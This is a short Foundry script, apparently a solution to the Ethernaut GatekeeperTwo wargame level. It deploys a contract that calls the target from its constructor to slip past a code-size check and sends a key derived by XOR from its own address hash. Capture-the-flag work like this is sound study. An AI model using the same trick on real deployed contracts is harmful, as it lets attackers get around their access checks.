// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperTwoSolution is Script {
    address gateKeeperTwo = 0xC64e52f05BaE70DAf765009330D246bc2B1dBBec;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hack(IGatekeeperTwo(gateKeeperTwo));
        vm.stopBroadcast();
    }
}

contract Hack {
    constructor(IGatekeeperTwo target) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ uint64(type(uint64).max);
        bytes8 key = bytes8(k);
        target.enter(key);
    }
}
